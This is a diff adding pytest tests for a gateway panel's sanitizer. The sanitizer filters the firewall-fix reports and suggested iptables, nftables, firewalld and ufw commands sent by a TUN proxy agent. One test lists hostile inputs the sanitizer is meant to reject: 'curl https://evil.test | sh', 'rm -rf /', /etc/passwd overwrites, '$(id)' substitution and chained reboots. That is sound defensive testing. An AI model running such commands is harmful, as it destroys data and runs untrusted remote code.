@@ -249,3 +249,184 @@ def test_persist_of_a_deleted_agent(home):
     routers('home', 'deleted-agent')
     code, data = post(client, headers, {'agent_id': 'deleted-agent'})
     assert (code, data['code']) == (404, 'AGENT_NOT_FOUND')
+
+
+# -- Full-TUN FORWARD filtering: a warning only ------------------------------
+
+def docker_filter(**fields):
+    """A may_drop report as Agent 1.8.42-go sends it for Docker's FORWARD policy."""
+    return {
+        'protocol': 1, 'state': 'may_drop', 'reason': '', 'device': 'Meta', 'auto_redirect': True, 'policy': 'drop',
+        'input_policy': 'accept', 'flows': ['forward'], 'forward_protocols': ['udp', 'icmp'],
+        'sources': [{'kind': 'docker', 'backend': 'nft', 'hook': 'forward', 'family': '', 'table': '', 'chain': '',
+                     'policy': 'drop', 'detail': 'FORWARD 默认策略为 DROP（Docker）'}],
+        'remedies': [{'source': 'docker', 'label': 'Docker', 'device': 'Meta',
+                      'commands': ['iptables -I DOCKER-USER -o Meta -j ACCEPT', 'iptables -I DOCKER-USER -i Meta -j ACCEPT'],
+                      'persist_note': '这两条规则重启后会丢失（重启 Docker 不会清空 DOCKER-USER）。'}],
+        'hint': '这台 Linux 的防火墙可能拦截经过 Mihomo TUN（Meta）的流量：主路由转来的 UDP（如 QUIC、语音通话、游戏）和 ping 会失败；其他 TCP 连接不受影响。',
+        'verify': '执行后回到这里刷新状态。', 'checked_at': '2026-10-24T03:00:00Z', 'cached': False, **fields}
+
+
+def test_view_carries_the_sanitized_forward_filter_without_changing_the_state(home):
+    client, headers, agent, routers, seen, replies = home
+    first, second, third = agent(9030), agent(9031), agent(9032)
+    routers('home', first, second, third)
+    replies[(9030, 'status')] = {**status(), 'forward_filter': docker_filter()}
+    replies[(9031, 'status')] = {**status(current='0', persisted=False, config='absent'),
+                                 'forward_filter': docker_filter(state='ok', policy='accept', sources=[], remedies=[])}
+    replies[(9032, 'status')] = status()  # An Agent before 1.8.42-go.
+    result = entries(client, headers)
+    assert [(item['state'], item['can_persist']) for item in result] == [
+        ('persisted', False), ('needs_persist', True), ('persisted', False)]
+    assert result[0]['forward_filter'] == docker_filter()
+    assert result[1]['forward_filter']['state'] == 'ok'
+    assert result[2]['forward_filter'] is None
+
+
+@pytest.mark.parametrize('value', [None, 'may_drop', [], {'state': 'blocking'}, {'hint': 'x'}])
+def test_view_drops_an_unusable_forward_filter(home, value):
+    client, headers, agent, routers, seen, replies = home
+    routers('home', agent(9033))
+    replies[(9033, 'status')] = {**status(), 'forward_filter': value}
+    [entry] = entries(client, headers)
+    assert entry['state'] == 'persisted'
+    assert entry['forward_filter'] is None
+
+
+def test_persist_response_has_no_forward_filter(home):
+    client, headers, agent, routers, seen, replies = home
+    agent_id = agent(9034)
+    routers('home', agent_id)
+    replies[(9034, 'forwarding')] = {'success': True, 'ipv4_forwarding': forwarding(),
+                                     'managed': {'active': False}, 'forward_filter': docker_filter()}
+    code, data = post(client, headers, {'agent_id': agent_id})
+    assert code == 200, data
+    assert data['gateway']['state'] == 'persisted'
+    assert data['gateway']['forward_filter'] is None
+
+
+@pytest.mark.parametrize('command', [
+    'grep -q -- x /etc/ufw/before.rules || sed -i "1d" /etc/passwd',
+    bridge.FORWARD_FILTER_UFW_BEFORE_RULES + '; reboot',
+    bridge.FORWARD_FILTER_UFW_BEFORE_RULES.replace('/etc/ufw/before.rules', '/etc/passwd'),
+    'sed -i 1d /etc/ufw/before.rules',
+    # Only the two exact firewalld existence checks may use '||' or a redirect.
+    'firewall-cmd --permanent --info-zone=public >/dev/null 2>&1 || firewall-cmd --permanent --new-zone=public',
+    'firewall-cmd --permanent --info-zone=configflow-tun >/dev/null 2>&1 || rm -rf /',
+    'firewall-cmd --permanent --info-zone=configflow-tun >/dev/null 2>&1 || firewall-cmd --permanent --new-zone=configflow-tun; reboot',
+    'firewall-cmd --permanent --info-policy=configflow-fwd > /etc/passwd',
+    'iptables -I FORWARD -o Meta -j ACCEPT; reboot',
+    'iptables -I FORWARD -o Meta -j ACCEPT | sh',
+    'iptables -I FORWARD -o $(id) -j ACCEPT',
+    'iptables -I FORWARD -o `id` -j ACCEPT',
+    'curl https://evil.test | sh',
+    'rm -rf /',
+    'iptables -I FORWARD -o Meta -j ACCEPT && rm -rf /',
+    'iptables -I FORWARD -o Meta -j ACCEPT > /etc/passwd',
+    'iptables -I FORWARD -o Meta\n-j ACCEPT',
+    'iptables  -I FORWARD',
+    'iptables',
+    'iptables -I FORWARD ' + 'x' * 240,
+    7,
+])
+def test_sanitize_drops_commands_that_are_not_plain_firewall_commands(command):
+    remedy = {'source': 'iptables', 'label': 'iptables', 'device': 'Meta',
+              'commands': [command, 'iptables -I FORWARD -i Meta -j ACCEPT'], 'persist_note': ''}
+    result = bridge.sanitize_forward_filter(docker_filter(remedies=[remedy]))
+    assert result['remedies'][0]['commands'] == ['iptables -I FORWARD -i Meta -j ACCEPT']
+
+
+def test_sanitize_keeps_every_command_form_the_agent_generates():
+    # Exactly what Agent 1.8.42-go generates (netfilter/remedy.go), lab-verified.
+    ufw_before_rules = ("grep -q -- '-A ufw-before-input -m conntrack --ctstate DNAT -j ACCEPT' /etc/ufw/before.rules || "
+                        "sed -i '/^# End required lines/a -A ufw-before-input -m conntrack --ctstate DNAT -j ACCEPT' "
+                        "/etc/ufw/before.rules")
+    commands = {
+        'docker': ['iptables -I DOCKER-USER -o Meta -j ACCEPT', 'iptables -I DOCKER-USER -i Meta -j ACCEPT'],
+        'iptables': ['iptables-legacy -I FORWARD -o utun.0 -j ACCEPT', 'iptables-legacy -I FORWARD -i utun.0 -j ACCEPT',
+                     'iptables-legacy -I INPUT -m conntrack --ctstate DNAT -j ACCEPT',
+                     'iptables-legacy -I INPUT -i utun.0 -j ACCEPT',
+                     'iptables-legacy -I INPUT -i eth0 -p udp --dport 53 -j ACCEPT',
+                     'iptables-legacy -I INPUT -i eth0 -p tcp --dport 53 -j ACCEPT'],
+        'nftables': ['nft \'insert rule inet filter forward oifname "Meta" accept\'',
+                     'nft \'insert rule inet filter forward iifname "Meta" accept\'',
+                     "nft 'insert rule inet filter input ct status dnat accept'",
+                     'nft \'insert rule inet filter input iifname "Meta" accept\'',
+                     'nft \'insert rule inet filter input iifname "eth0" udp dport 53 accept\'',
+                     'nft \'insert rule inet filter input iifname "eth0" tcp dport 53 accept\''],
+        'firewalld': ['firewall-cmd --permanent --info-zone=configflow-tun >/dev/null 2>&1 || '
+                      'firewall-cmd --permanent --new-zone=configflow-tun',
+                      'firewall-cmd --permanent --zone=configflow-tun --set-target=ACCEPT',
+                      'firewall-cmd --permanent --zone=configflow-tun --change-interface=Meta',
+                      'firewall-cmd --permanent --info-policy=configflow-fwd >/dev/null 2>&1 || '
+                      'firewall-cmd --permanent --new-policy=configflow-fwd',
+                      'firewall-cmd --permanent --policy=configflow-fwd --add-ingress-zone=ANY',
+                      'firewall-cmd --permanent --policy=configflow-fwd --add-egress-zone=configflow-tun',
+                      'firewall-cmd --permanent --policy=configflow-fwd --set-target=ACCEPT',
+                      'firewall-cmd --permanent --zone=public --add-service=dns',
+                      'firewall-cmd --reload'],
+        'ufw': ['ufw route allow in on Meta', 'ufw route allow out on Meta', 'ufw allow in on Meta',
+                'ufw allow in on eth0 to any port 53', ufw_before_rules, 'ufw reload'],
+    }
+    assert ufw_before_rules == bridge.FORWARD_FILTER_UFW_BEFORE_RULES
+    remedies = [{'source': source, 'label': source, 'device': 'Meta', 'commands': lines, 'persist_note': 'n'}
+                for source, lines in commands.items()]
+    result = bridge.sanitize_forward_filter(docker_filter(remedies=remedies))
+    assert {remedy['source']: remedy['commands'] for remedy in result['remedies']} == commands
+
+
+def test_sanitize_keeps_only_known_forward_protocols():
+    # Only ping is dropped: the panel must not claim UDP is blocked.
+    assert bridge.sanitize_forward_filter(docker_filter(forward_protocols=['icmp']))['forward_protocols'] == ['icmp']
+    assert bridge.sanitize_forward_filter(docker_filter(
+        forward_protocols=['icmp', 'sctp', 'tcp', {}, 'udp; reboot', 'tcp']))['forward_protocols'] == ['tcp', 'icmp']
+    # An Agent that does not report them, or a report without a forward flow.
+    assert bridge.sanitize_forward_filter(docker_filter(forward_protocols=None))['forward_protocols'] == []
+    without = docker_filter()
+    del without['forward_protocols']
+    assert bridge.sanitize_forward_filter(without)['forward_protocols'] == []
+    assert bridge.sanitize_forward_filter(docker_filter(flows=['local_dns']))['forward_protocols'] == []
+
+
+def test_sanitize_reduces_fields_to_known_values():
+    result = bridge.sanitize_forward_filter(docker_filter(
+        protocol='1', reason='Timeout!', device='bad device', auto_redirect='yes', policy='reject',
+        hint='第一行\n‮第二行' + '长' * 500, verify=5, input_policy='reject', flows=['tun_tcp', 'local_dns', 'forward', 'bogus', {}, 'forward'], checked_at='2026-10-24T03:00:00Z' + 'z' * 60, cached=1,
+        extra='ignored',
+        sources=[{'kind': 'nftables', 'backend': 'other', 'family': 'inet', 'table': 'filter', 'chain': 'for ward',
+                  'policy': 'drop', 'detail': '\x1b[31mred'}, {'kind': 'shell'}, 'x'] * 4,
+        remedies=[{'source': 'docker', 'label': 'L' * 100, 'device': 'Meta', 'commands': ['ufw route allow in on Meta'] * 14,
+                   'persist_note': None}, {'source': 'cron', 'commands': ['ufw status']}, None] * 4))
+    assert set(result) == {'protocol', 'state', 'reason', 'device', 'auto_redirect', 'policy', 'input_policy', 'flows',
+                           'forward_protocols', 'sources', 'remedies', 'hint', 'verify', 'checked_at', 'cached'}
+    assert (result['input_policy'], result['flows']) == ('', ['forward', 'local_dns', 'tun_tcp'])
+    assert result['forward_protocols'] == ['udp', 'icmp']
+    assert (result['protocol'], result['reason'], result['device'], result['auto_redirect'], result['policy'],
+            result['cached']) == (0, '', '', False, '', False)
+    assert result['hint'].startswith('第一行第二行') and len(result['hint']) == 400
+    assert result['verify'] == '' and len(result['checked_at']) == 40
+    assert len(result['sources']) == 4
+    assert result['sources'][0] == {'kind': 'nftables', 'backend': '', 'hook': '', 'family': 'inet', 'table': 'filter',
+                                    'chain': '', 'policy': 'drop', 'detail': '[31mred'}
+    assert len(result['remedies']) == 4
+    assert result['remedies'][0]['label'] == 'L' * 80
+    assert len(result['remedies'][0]['commands']) == bridge.FORWARD_FILTER_MAX_COMMANDS
+    assert result['remedies'][0]['persist_note'] == ''
+
+
+def test_sanitize_limits_groups_and_needs_a_valid_device_for_commands():
+    remedy = {'source': 'ufw', 'label': 'UFW', 'device': 'Meta', 'commands': ['ufw route allow in on Meta']}
+    many = bridge.sanitize_forward_filter(docker_filter(remedies=[remedy] * 9,
+                                                        sources=[{'kind': 'ufw', 'policy': 'drop'}] * 12))
+    assert len(many['remedies']) == bridge.FORWARD_FILTER_MAX_REMEDIES
+    assert len(many['sources']) == bridge.FORWARD_FILTER_MAX_SOURCES
+    manual = bridge.sanitize_forward_filter(docker_filter(remedies=[{**remedy, 'device': 'Meta;x'}]))
+    assert manual['remedies'] == [{'source': 'ufw', 'label': 'UFW', 'device': '', 'commands': [], 'persist_note': ''}]
+
+
+@pytest.mark.parametrize('state', sorted(bridge.FORWARD_FILTER_STATES))
+def test_sanitize_accepts_each_agent_state(state):
+    value = {'protocol': 1, 'state': state, 'reason': 'linux_gateway' if state == 'not_applicable' else '',
+             'sources': [], 'remedies': []}
+    result = bridge.sanitize_forward_filter(value)
+    assert result['state'] == state and result['sources'] == [] and result['remedies'] == []
